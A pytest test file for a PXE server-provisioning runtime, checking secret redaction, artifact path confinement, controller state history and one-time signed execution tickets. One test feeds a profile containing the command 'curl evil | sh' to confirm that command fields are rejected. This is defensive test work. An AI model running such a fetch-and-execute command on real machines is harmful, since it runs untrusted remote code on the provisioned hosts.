from __future__ import annotations

import hashlib
import hmac
import json
import time
from pathlib import Path

import pytest
from fastapi import HTTPException

from hermes_node_agent import infrastructure_runtime as runtime


def _hashed(snapshot: dict) -> dict:
    snapshot = dict(snapshot)
    snapshot["snapshot_hash"] = runtime.sha256_hex(snapshot)
    return snapshot


def _pxe_provider() -> dict:
    return _hashed({
        "id": "ipr_pxe12345678",
        "name": "pxe-private",
        "kind": "pxe",
        "endpoint": "https://pxe.internal.example/v1",
        "credential_ref": "cred_pxecontroller1",
        "credential_snapshot": {"id": "cred_pxecontroller1", "kind": "generic", "status": "configured", "metadata": {}},
        "api_version": "v1",
        "implementation_version": "hermes-pxe-controller-v1",
        "site": "dc1",
        "zone": "rack-a",
        "capabilities": {"network_scope": "private-offline", "artifact_delivery": "shared-readonly-mirror"},
        "labels": {},
        "health_status": "HEALTHY",
        "status": "configured",
    })


def _boot_provider() -> dict:
    return _hashed({
        "id": "ipr_boot12345678",
        "name": "bmc-a",
        "kind": "redfish",
        "endpoint": "https://bmc.internal.example/redfish/v1",
        "credential_ref": "cred_redfish12345",
        "credential_snapshot": {"id": "cred_redfish12345", "kind": "generic", "status": "configured", "metadata": {}},
        "api_version": "1.20.0",
        "implementation_version": "redfish-http-v1",
        "site": "dc1",
        "zone": "rack-a",
        "capabilities": {"system_id": "System.Embedded.1"},
        "labels": {},
        "health_status": "HEALTHY",
        "status": "configured",
    })


def _server() -> dict:
    return _hashed({
        "entity_type": "server",
        "kind": "registered-server",
        "id": "srv_pxe12345678",
        "hostname": "node01.example.internal",
        "environment_id": "env_test12345678",
        "management_ip": "10.70.0.11",
        "provisioning_ip": "10.71.0.11",
        "bmc_ip": "10.72.0.11",
        "ssh_port": 22,
        "ssh_user": "root",
        "host_fingerprint": "SHA256:" + "C" * 43,
        "connection_mode": "agent",
        "credential_ref": "cred_server12345",
        "bmc_credential_ref": None,
        "architecture": "amd64",
        "site": "dc1",
        "rack": "rack-a",
        "zone": "rack-a",
        "labels": {
            "provisioning_mac": "52:54:00:12:34:56",
            "provisioning_nic": "eno1",
            "boot_provider_id": "ipr_boot12345678",
        },
        "status": "configured",
        "preflight_status": "PASS",
    })


def _artifact_supply(tmp_path: Path) -> tuple[dict, dict[str, str]]:
    roles: dict[str, str] = {}
    artifacts: dict[str, dict] = {}
    for index, role in enumerate(("kernel", "initrd", "unattended"), start=1):
        path = tmp_path / f"{role}.bin"
        data = f"hermes-{role}-artifact".encode()
        path.write_bytes(data)
        artifact_id = f"art_{index:016x}"
        roles[role] = artifact_id
        artifacts[role] = {
            "artifact_id": artifact_id,
            "kind": "package",
            "version": "1.0",
            "digest": "sha256:" + hashlib.sha256(data).hexdigest(),
            "offline_reference": path.as_uri(),
        }
    supply = {
        "mode": "pxe-ready-manifest-bound",
        "manifest_hash": "a" * 64,
        "artifacts": artifacts,
        "credential_material_in_plan": False,
        "public_network_required": False,
        "provisioner_rewrite_applied": True,
    }
    supply["supply_hash"] = runtime.sha256_hex(supply)
    return supply, roles


def _credential(tmp_path: Path, callback_token: str = "callback-secret-value") -> tuple[dict, str]:
    callback = tmp_path / "callback.token"
    callback.write_text(callback_token, encoding="utf-8")
    profile = tmp_path / "ubuntu.profile.json"
    profile.write_text(json.dumps({
        "schema_version": 1,
        "os_family": "ubuntu",
        "hostname_template": "node01",
        "locale": "en_US.UTF-8",
        "timezone": "UTC",
        "keyboard": "us",
        "packages": ["curl", "ca-certificates"],
        "storage_profile_ref": "storage_default",
        "network_profile_ref": "network_provisioning",
        "secret_refs": ["secret_os_registration"],
    }), encoding="utf-8")
    return {
        "token": "controller-bearer-secret",
        "ca_file": None,
        "unattended_profiles": {"profile_ubuntu": profile},
        "callback_tokens": {"callback_node01": callback},
    }, hashlib.sha256(callback_token.encode()).hexdigest()


def _typed(tmp_path: Path, *, runtime_preview: dict | None = None, operation: str = "os.provision") -> tuple[dict, dict]:
    provider = _pxe_provider()
    supply, roles = _artifact_supply(tmp_path)
    _, callback_hash = _credential(tmp_path)
    desired = {
        "boot_method": "ipxe",
        "boot_mode": "uefi",
        "artifacts": roles,
        "unattended_profile_ref": "profile_ubuntu",
        "callback_ref": "callback_node01",
        "callback_token_sha256": callback_hash,
        "completion_timeout_seconds": 600,
        "host_ready_timeout_seconds": 30,
    }
    if operation == "os.reimage":
        desired["confirm_server"] = "node01.example.internal"
    typed = {
        "schema_version": 5,
        "kind": "PXEProvisioningPlan",
        "operation": operation,
        "provider": {
            "id": provider["id"], "kind": provider["kind"], "api_version": provider["api_version"],
            "implementation_version": provider["implementation_version"], "credential_ref": provider["credential_ref"],
            "snapshot_hash": provider["snapshot_hash"],
        },
        "targets": [provider, _server(), _boot_provider()],
        "desired_state": desired,
        "artifact_supply": supply,
        "runtime_preview": runtime_preview,
    }
    typed["plan_hash"] = runtime.sha256_hex(typed)
    return typed, supply


def _ticket(typed: dict, key: str) -> tuple[dict, str]:
    plan = {"parameters": {"typed_plan": typed}}
    ticket = {
        "changeset_id": "chg_0123456789abcdef",
        "plan_hash": runtime.sha256_hex(plan),
        "plan": plan,
        "preconditions": {
            "operation_job_id": "opj_0123456789abcdef",
            "operation_plan_id": "opn_0123456789abcdef",
            "executor": "infrastructure-provider-worker",
            "typed_plan_hash": typed["plan_hash"],
            "policy_generation": 1,
        },
        "issued_at": int(time.time()),
        "expires_at": int(time.time()) + 120,
    }
    sig = hmac.new(key.encode(), runtime.canonical_json(ticket).encode(), hashlib.sha256).hexdigest()
    return ticket, sig


def _idle_current() -> dict:
    return {
        "controller": {
            "registered": False, "node_id": "srv_pxe12345678", "nic": "eno1", "mac": "52:54:00:12:34:56",
            "state": "idle", "state_history": [], "plan_hash": "", "artifact_manifest_hash": "",
            "callback_token_sha256": "", "management_ip": "",
        },
        "boot_provider": {
            "provider_kind": "redfish", "resource_id": "System.Embedded.1", "power_state": "On",
            "boot_target": "Hdd", "boot_enabled": "Disabled", "boot_mode": "UEFI",
        },
    }


def test_pxe_preview_binds_artifacts_node_boot_provider_and_hides_worker_secrets(tmp_path: Path, monkeypatch):
    typed, supply = _typed(tmp_path)
    credential, _ = _credential(tmp_path)
    monkeypatch.setattr(runtime, "_pxe_credential_profile", lambda ref: credential)
    monkeypatch.setattr(runtime, "_pxe_preview_current", lambda *args: _idle_current())
    preview = runtime.preview({"parameters": {"typed_plan": typed}})
    encoded = json.dumps(preview, sort_keys=True)
    assert preview["provider_kind"] == "pxe"
    assert preview["active_probe"] is True
    assert preview["current_hash"] == runtime.sha256_hex(preview["current"])
    assert {item["field"] for item in preview["diff"]} >= {"provisioning_state", "artifact_manifest_hash", "callback_token_sha256", "boot_target", "boot_enabled"}
    assert supply["manifest_hash"] in encoded
    assert "controller-bearer-secret" not in encoded
    assert "callback-secret-value" not in encoded
    assert "secret_os_registration" not in encoded


def test_pxe_artifact_rehash_is_confined_to_configured_mirror_root(tmp_path: Path, monkeypatch):
    mirror = tmp_path / "mirror"
    mirror.mkdir()
    supply, _ = _artifact_supply(mirror)
    monkeypatch.setattr(runtime, "ARTIFACT_MIRROR_ROOT", mirror)
    runtime._pxe_verify_artifact_files(supply)

    outside = tmp_path / "outside.bin"
    outside.write_bytes(b"outside")
    bad = json.loads(json.dumps(supply))
    bad["artifacts"]["kernel"]["offline_reference"] = outside.as_uri()
    bad["artifacts"]["kernel"]["digest"] = "sha256:" + hashlib.sha256(b"outside").hexdigest()
    with pytest.raises(HTTPException) as exc:
        runtime._pxe_verify_artifact_files(bad)
    assert exc.value.status_code == 409
    assert "escapes" in str(exc.value.detail)


def test_pxe_completion_requires_full_monotonic_controller_history():
    server = runtime._pxe_server_target({"targets": [_server()]})
    complete = {
        "node_id": server["id"], "nic": "eno1", "mac": "52:54:00:12:34:56", "state": "complete",
        "state_history": ["requested", "booting", "installer-started", "installing", "complete"],
        "plan_hash": "b" * 64, "artifact_manifest_hash": "a" * 64, "callback_token_sha256": "c" * 64,
        "management_ip": server["management_ip"],
    }
    assert runtime._pxe_safe_controller_snapshot(complete, server)["state"] == "complete"
    bad = dict(complete)
    bad["state_history"] = ["requested", "booting", "complete"]
    with pytest.raises(HTTPException) as exc:
        runtime._pxe_safe_controller_snapshot(bad, server)
    assert exc.value.status_code == 502
    assert "skipped" in str(exc.value.detail) or "required" in str(exc.value.detail)


def test_pxe_private_offline_controller_scope_is_mandatory():
    provider = _pxe_provider()
    provider["capabilities"] = {}
    with pytest.raises(HTTPException) as exc:
        runtime._pxe_endpoint(provider)
    assert exc.value.status_code == 422
    assert "private-offline" in str(exc.value.detail)


def test_pxe_unattended_profile_rejects_command_surfaces(tmp_path: Path):
    profile = tmp_path / "bad.profile.json"
    profile.write_text(json.dumps({"schema_version": 1, "os_family": "ubuntu", "late_command": "curl evil | sh"}), encoding="utf-8")
    credential = {"unattended_profiles": {"profile_bad": profile}}
    with pytest.raises(HTTPException) as exc:
        runtime._pxe_unattended_profile(credential, "profile_bad")
    assert exc.value.status_code == 503
    assert "command/script" in str(exc.value.detail)


def test_signed_pxe_execution_is_one_time_bound_and_returns_typed_active_verification(tmp_path: Path, monkeypatch):
    preliminary, supply = _typed(tmp_path)
    credential, callback_hash = _credential(tmp_path)
    current = _idle_current()
    preview = {
        "kind": "InfrastructureRuntimePreview", "provider_kind": "pxe", "operation": "os.provision",
        "typed_plan_hash": preliminary["plan_hash"], "current": current, "current_hash": runtime.sha256_hex(current),
        "desired_state": preliminary["desired_state"], "diff": [], "active_probe": True,
        "credential_material_returned": False, "secret_output_suppressed": True, "arbitrary_cli": False, "arbitrary_shell": False,
    }
    typed, _ = _typed(tmp_path, runtime_preview=preview)
    key = "execution-key-0123456789abcdef0123456789abcdef"
    ticket, signature = _ticket(typed, key)
    monkeypatch.setattr(runtime, "EXECUTION_ENABLED", True)
    monkeypatch.setattr(runtime, "EXECUTION_KEY", key)
    monkeypatch.setattr(runtime, "ARTIFACT_MIRROR_ROOT", tmp_path)
    monkeypatch.setattr(runtime, "_pxe_credential_profile", lambda ref: credential)
    monkeypatch.setattr(runtime, "_pxe_preview_current", lambda *args: current)
    calls: list[str] = []
    monkeypatch.setattr(runtime, "_pxe_prepare", lambda *args: calls.append("prepare"))
    monkeypatch.setattr(runtime, "_pxe_set_one_time_boot_and_start", lambda *args: calls.append("boot") or {})
    monkeypatch.setattr(runtime, "_pxe_start", lambda *args: calls.append("start"))
    monkeypatch.setattr(runtime, "_pxe_wait_complete", lambda *args: ({
        "state": "complete", "plan_hash": typed["plan_hash"], "artifact_manifest_hash": supply["manifest_hash"],
        "callback_token_sha256": callback_hash, "management_ip": "10.70.0.11",
    }, ["requested", "booting", "installer-started", "installing", "complete"]))
    monkeypatch.setattr(runtime, "_pxe_host_ready", lambda *args: True)
    runtime._USED_TICKETS.clear()
    result = runtime.execute(ticket, signature)
    assert calls == ["prepare", "boot", "start"]
    assert result["state"] == "SUCCEEDED"
    assert [item["id"] for item in result["verification"]["checks"]] == [
        "provider-state-drift", "pxe-artifact-binding", "pxe-callback-binding", "pxe-state-machine", "pxe-host-readiness",
    ]
    evidence = result["verification"]["evidence"]
    assert evidence["arbitrary_ipxe_script"] is False
    assert evidence["raw_credentials_returned"] is False
    assert "callback-secret-value" not in json.dumps(result)
    with pytest.raises(HTTPException) as replay:
        runtime.execute(ticket, signature)
    assert replay.value.status_code == 409
    assert "already been used" in str(replay.value.detail)
